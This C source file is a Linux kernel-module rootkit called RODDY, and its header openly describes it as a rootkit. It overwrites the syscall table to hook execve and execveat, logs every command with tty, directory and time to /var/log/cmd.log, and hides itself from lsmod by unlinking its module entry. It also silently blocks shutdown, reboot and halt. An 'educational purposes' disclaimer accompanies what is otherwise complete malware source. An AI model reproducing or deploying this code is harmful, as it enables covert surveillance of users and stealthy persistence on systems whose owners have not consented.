
/*

Author: Trevohack 

RODDY is a linux (ring0) level rootkit, designed to log commands run inside the system. 

FEATURES
-------- 

--> Hides itself from `lsmod` output
--> All the commands run are logged in /var/log/cmd.log file. 
--> In general, the LKM hooks `execve` and `execveat` system calls to acheive this behavior. 
--> Logs tty, directory, time, binary and the full command run. 


IMPORTANT
--------- 

--> RODDY is designed only for educational purposes. 
--> Use the tool safely.  

*/



#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/timekeeping.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kallsyms.h>
#include <linux/limits.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/string.h>
#include <linux/timekeeping.h>
#include <asm/unistd.h>
#include <linux/tty.h>
#include <linux/mount.h>
#include <linux/fs_struct.h>
#include <linux/path.h> 
#include <linux/signal.h>
#include <linux/sched.h> 
#include <linux/kthread.h> 
#include <linux/delay.h>  
#include <linux/sched/signal.h> 


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM Library: Log comands run on the system"); 

#define LOG_FILE "/var/log/cmd.log" 
#define LOG_SIZE 4096
#define MAX_ARG_STRLEN 4096 

#define PROTECTED_DIRS_COUNT 5 
#define PROTECTED_DIRS {"/root", "/var", "/etc", "/tmp", "/usr"} 
#define PROTECTED_DIRS_LENGTHS {5, 4, 4, 4, 4} 

unsigned long *sys_call_table;
static int hidden = 0; 
static int activate_autohide = 1; 
static DEFINE_MUTEX(hide_lock); 

static asmlinkage long (*orig_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
static asmlinkage long (*orig_execveat)(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags); 


int compare_path(int fd, char *path);
static void set_root(void);
static void hideme(void);
static struct task_struct *task; 


static bool notrace is_protected_directory(const char *filename) {
    char *protected_dirs[PROTECTED_DIRS_COUNT] = PROTECTED_DIRS;
    int dir_lengths[PROTECTED_DIRS_COUNT] = PROTECTED_DIRS_LENGTHS;
    int i;

    for (i = 0; i < PROTECTED_DIRS_COUNT; i++) {
        if (strncmp(filename, protected_dirs[i], dir_lengths[i]) == 0) {
            return true;
        }
    }

    return false;
}

static void notrace get_tty_string(char *buf, size_t size) {
    struct tty_struct *tty;
    tty = get_current_tty();
    if (tty) {
        snprintf(buf, size, "tty:%s", tty_name(tty));
    } else {
        snprintf(buf, size, "tty:none");
    }
}

static void notrace get_time_string(char *buf, size_t size) {
    struct timespec64 ts;
    ktime_get_real_ts64(&ts);
    snprintf(buf, size, "[%llu.%09llu]", (unsigned long long)ts.tv_sec, (unsigned long long)ts.tv_nsec);
}

char *get_cwd_string(void) {
    char *buf = (char *)__get_free_page(GFP_KERNEL);
    char *cwd;
    struct path pwd;

    if (!buf)
        return NULL;

    get_fs_pwd(current->fs, &pwd);
    cwd = dentry_path_raw(pwd.dentry, buf, PAGE_SIZE);
    if (IS_ERR(cwd)) {
        free_page((unsigned long)buf);
        return NULL;
    }

    cwd = kstrdup(cwd, GFP_KERNEL);
    free_page((unsigned long)buf);
    return cwd;
}


static void notrace log_command(const char *command, const char *args, const char *cwd, const char *tty) {
    struct file *file;
    mm_segment_t old_fs;
    loff_t pos = 0;
    char *time_str;
    char *log_entry;

    time_str = kmalloc(64, GFP_KERNEL);
    if (!time_str) return;

    log_entry = kmalloc(LOG_SIZE, GFP_KERNEL);
    if (!log_entry) {
        kfree(time_str);
        return;
    }

    get_time_string(time_str, 64);
    snprintf(log_entry, LOG_SIZE, "[TIME: %s] | [TTY: %s | CWD: %s | BIN: %s] ~ %s\n", time_str, tty, cwd, command, args);

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    file = filp_open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    set_fs(old_fs);

    if (!IS_ERR(file)) {
        old_fs = get_fs();
        set_fs(KERNEL_DS);
        vfs_write(file, log_entry, strlen(log_entry), &pos);
        set_fs(old_fs);
        filp_close(file, NULL);
    }

    kfree(time_str);
    kfree(log_entry);
}

static char *notrace get_args_string(const char __user *const __user *argv) {
    char *args;
    char *arg;
    int len;
    int i;

    args = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
    if (!args) return NULL;

    args[0] = '\0';

    for (i = 0; argv[i]; i++) {
        arg = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
        if (!arg) {
            kfree(args);
            return NULL;
        }

        len = strncpy_from_user(arg, argv[i], MAX_ARG_STRLEN);
        if (len < 0) {
            kfree(arg);
            kfree(args);
            return NULL;
        }

        strcat(args, arg);
        strcat(args, " ");
        kfree(arg);
    }

    return args;
}



static int notrace check_forbidden_command(const char __user *filename, const char __user *const __user *argv) {
    char *kernel_filename;
    char *kernel_argv0;
    int ret = 0;

    kernel_filename = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!kernel_filename) return -ENOMEM;

    if (strncpy_from_user(kernel_filename, filename, PATH_MAX) < 0) {
        kfree(kernel_filename);
        return -EFAULT;
    }

    if (strcmp(kernel_filename, "/sbin/shutdown") == 0 ||
        strcmp(kernel_filename, "/sbin/reboot") == 0 ||
        strcmp(kernel_filename, "/bin/exit") == 0 ||
        strcmp(kernel_filename, "/sbin/halt") == 0 ||
        strcmp(kernel_filename, "shutdown") == 0 ||
        strcmp(kernel_filename, "reboot") == 0 ||
        strcmp(kernel_filename, "exit") == 0 ||
        strcmp(kernel_filename, "halt") == 0) 
    {
        ret = 1; 
    }

    if (!ret && argv) {
        kernel_argv0 = kmalloc(PATH_MAX, GFP_KERNEL);
        if (kernel_argv0) {
            if (strncpy_from_user(kernel_argv0, argv[0], PATH_MAX) >= 0) {
                if (strcmp(kernel_argv0, "shutdown") == 0 ||
                    strcmp(kernel_argv0, "reboot") == 0 ||
                    strcmp(kernel_argv0, "exit") == 0 ||
                    strcmp(kernel_argv0, "halt") == 0) 
                {
                    ret = 1; 
                }
            }
            kfree(kernel_argv0);
        }
    }

    kfree(kernel_filename);
    return ret;
}

notrace asmlinkage long hook_execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp) {
    char *args, *cwd, *tty;

    if (activate_autohide && !hidden) {
        mutex_lock(&hide_lock);
        hideme();
        hidden = 1;
        mutex_unlock(&hide_lock);
    }

    if (check_forbidden_command(filename, argv)) {
        return 0; 
    }

    args = get_args_string(argv);
    if (!args) return -ENOMEM;


    cwd = get_cwd_string();
    if (!cwd) {
        kfree(args);
        return -ENOMEM;
    }

    tty = kmalloc(64, GFP_KERNEL);
    if (!tty) {
        kfree(args);
        kfree(cwd);
        return -ENOMEM;
    }

    get_tty_string(tty, 64);
    log_command(filename, args, cwd, tty);

    kfree(args);
    kfree(cwd);
    kfree(tty);

    return orig_execve(filename, argv, envp);
}

notrace asmlinkage long hook_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags) {
    char *args, *cwd, *tty;

    if (activate_autohide && !hidden) {
        mutex_lock(&hide_lock);
        hideme();
        hidden = 1;
        mutex_unlock(&hide_lock);
    }

    if (check_forbidden_command(filename, argv)) {
        return 0; 
    }


    args = get_args_string(argv);
    if (!args) return -ENOMEM;

    cwd = get_cwd_string();
    if (!cwd) {
        kfree(args);
        return -ENOMEM;
    }

    tty = kmalloc(64, GFP_KERNEL);
    if (!tty) {
        kfree(args);
        kfree(cwd);
        return -ENOMEM;
    }

    get_tty_string(tty, 64);
    log_command(filename, args, cwd, tty);

    kfree(args);
    kfree(cwd);
    kfree(tty);

    return orig_execveat(dfd, filename, argv, envp, flags);
}

static notrace void hideme(void) {
    struct module *mod;
    mod = THIS_MODULE;
    if (mod) {
        list_del(&mod->list);
    }
}


notrace static int rootkit_init(void)
{
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        return -1;
    }

    write_cr0(read_cr0() & (~0x00010000));

    orig_execve = (void *)sys_call_table[__NR_execve];
    orig_execveat = (void *)sys_call_table[__NR_execveat];  

    sys_call_table[__NR_execve] = (unsigned long)hook_execve;
    sys_call_table[__NR_execveat] = (unsigned long)hook_execveat; 


    write_cr0(read_cr0() | 0x00010000);


    return 0;
}

notrace static void rootkit_exit(void)
{

    write_cr0(read_cr0() & (~0x00010000));

    sys_call_table[__NR_execve] = (unsigned long)orig_execve;
    sys_call_table[__NR_execveat] = (unsigned long)orig_execveat; 



    write_cr0(read_cr0() | 0x00010000);
}




module_init(rootkit_init);
module_exit(rootkit_exit);
